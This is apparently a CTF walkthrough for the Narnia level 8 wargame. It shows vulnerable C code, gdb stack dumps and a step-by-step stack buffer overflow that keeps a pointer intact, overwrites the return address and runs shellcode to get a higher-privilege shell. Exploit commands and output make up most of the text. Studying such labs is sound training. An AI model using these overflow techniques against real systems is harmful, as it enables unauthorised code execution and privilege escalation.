@@ -1,0 +1,135 @@
+ 23 int i;
+ 24  
+ 25 void func(char *b){
+ 26     char *blah=b;
+ 27     char bok[20];
+ 28     //int i=0;
+ 29  
+ 30     memset(bok, '\0', sizeof(bok));
+ 31     for(i=0; blah[i] != '\0'; i++)
+ 32         bok[i]=blah[i];
+ 33  
+ 34     printf("%s\n",bok);
+ 35 }
+ 36  
+ 37 int main(int argc, char **argv){
+ 38  
+ 39     if(argc > 1)
+ 40         func(argv[1]);
+ 41     else
+ 42     printf("%s argument\n", argv[0]);
+ 43  
+ 44     return 0;
+
+The overflow happens at line 32 as it doesnt check for the size of the blah array.
+
+(gdb) r $(python /tmp/tmp112/exploit.py) // "A" * 20
+Starting program: /narnia/narnia8 $(python /tmp/tmp112/exploit.py)
+AAAAAAAAAAAAAAAAAAAA������������� // this weird output at the end is 0xffffd888 0xffffd6a8 0x080484a7 0xffffd888 0a
+This is from blah not copying byte /0 to bok, this shows that below the AAAA(0x41414141) are from bok. As bok is size 
+20 so only the 20 A's are copyed(no /0). 
+
+Breakpoint 1, 0x0804848e in func ()
+(gdb) x/20wx $esp
+0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd694:     0x41414141      0xffffd888      0xffffd6a8      0x080484a7
+0xffffd6a4:     0xffffd888      0x00000000      0xf7e2a286      0x00000002
+0xffffd6b4:     0xffffd744      0xffffd750      0x00000000      0x00000000
+0xffffd6c4:     0x00000000      0xf7fc5000      0xf7ffdc0c      0xf7ffd000
+(gdb) x/x 0xffffd888
+0xffffd888:     0x41414141
+(gdb) x/x 0xffffd887
+0xffffd887:     0x41414100
+(gdb) x/x 0xffffd889
+0xffffd889:     0x41414141
+(gdb) 
+
+as you can see the 0xffffd888 is the blah pointer (the first instance of) also
+(gdb) x/x 0x080484a7
+0x80484a7 <main+23>:    0xeb04c483
+(gdb) 
+
+0x080484a7 is the return pointer (to main).
+
+so lets try with 21 A's
+
+Starting program: /narnia/narnia8 $(python /tmp/tmp112/exploit.py)
+AAAAAAAAAAAAAAAAAAAAA������������
+
+Breakpoint 1, 0x0804848e in func ()
+(gdb) x/20wx $esp
+0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd694:     0x41414141      0xffffd841      0xffffd6a8      0x080484a7
+0xffffd6a4:     0xffffd887      0x00000000      0xf7e2a286      0x00000002
+0xffffd6b4:     0xffffd744      0xffffd750      0x00000000      0x00000000
+0xffffd6c4:     0x00000000      0xf7fc5000      0xf7ffdc0c      0xf7ffd000
+
+as you can see the blah pointer is now 0xffffd841. So the aim is to keep the address the same so the for loop doesnt
+stop and we can overflow the return pointer. We also have to take in to count that the blah pointer will change 
+depending on the inputs size. lets try 19 A's compare it to it too the 0xffffd888.
+
+Starting program: /narnia/narnia8 $(python /tmp/tmp112/exploit.py)
+AAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x0804848e in func ()
+(gdb) x/20wx $esp
+0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd694:     0x00414141      0xffffd889      0xffffd6a8      0x080484a7
+0xffffd6a4:     0xffffd889      0x00000000      0xf7e2a286      0x00000002
+0xffffd6b4:     0xffffd744      0xffffd750      0x00000000      0x00000000
+0xffffd6c4:     0x00000000      0xf7fc5000      0xf7ffdc0c      0xf7ffd000
+
+so now its 0xffffd889
+
+so lets try and overwrite the return pointer by overwriting what the blah pointer should be so the for loop doesnt stop (remember that the corrent blah pointer changes based on input size).
+
+Starting program: /narnia/narnia8 $(python /tmp/tmp112/exploit.py) // "A" * 20 + "\x7C\xd8\xff\xff" + struct.pack("I",0xffffd6a8) + "DDDD"
+AAAAAAAAAAAAAAAAAAAA|�������DDDD|���
+
+Breakpoint 1, 0x0804848e in func ()
+(gdb) x/20wx $esp
+0xffffd674:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd684:     0x41414141      0xffffd87c      0xffffd6a8      0x44444444
+0xffffd694:     0xffffd87c      0x00000000      0xf7e2a286      0x00000002
+0xffffd6a4:     0xffffd734      0xffffd740      0x00000000      0x00000000
+0xffffd6b4:     0x00000000      0xf7fc5000      0xf7ffdc0c      0xf7ffd000
+
+so the return pointer is overwriten, nice. lets change the DDDD to the address after the return pointer(change to 0xffffd694 in this case but this will change) and place the shellcode 
+there (as bok is too small for the shellcode, you could use an ENV variable)
+
+(gdb) r $(python /tmp/tmp112/exploit.py) // A" * 20 + "\x43\xd8\xff\xff" + struct.pack("I",0xffffd6a8) + struct.pack("I",0xffffd664) +  SHELLCODE
+Starting program: /narnia/narnia8 $(python /tmp/tmp112/exploit.py)
+AAAAAAAAAAAAAAAAAAAAC�������d����^1ɱ!�l���u�������k
+                                                   Y�Sgi.q��Skii0cbti0cjo��SRT��΁P��
+process 19986 is executing new program: /bin/bash
+
+(gdb) x/20wx $esp
+0xffffd644:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd654:     0x41414141      0xffffd843      0xffffd6a8      0xffffd664
+0xffffd664:     0x315e11eb      0x8021b1c9      0x01ff0e6c      0x7501e980
+0xffffd674:     0xe805ebf6      0xffffffea      0x9a590c6b      0x2e696753
+0xffffd684:     0x53e28a71      0x3069696b      0x69746263      0x6f6a6330
+
+nice, now we have to do it outside gdb, we can work out the addresses by using ./narnia8 $(python -c 'print("A" * 20)') | xxd
+and getting the blah pointer address. 
+
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 a6d8 ffff d8d6 ffff a784 0408  AAAA............
+00000020: a6d8 ffff 0a   
+
+so its 0xffffd8a6
+
+changed the return addess to 0xffffd881 (0xffffd8a6 -69 + 20 + 4 + 4 + 4)
+
+./narnia8 $(python /tmp/tmp112/exploit.py) // 
+AAAAAAAAAAAAAAAAAAAAa������������^1ɱ!�l���u�������k
+                                                   Y�Sgi.q��Skii0cbti0cjo��SRT��΁P��
+bash-4.4$ whoami
+narnia9
+bash-4.4$ 
+
+Done
+
+https://www.youtube.com/watch?v=nAMznri1EMQ
+
+http://perso.heavyberry.com/articles/2017-06/narnia-08
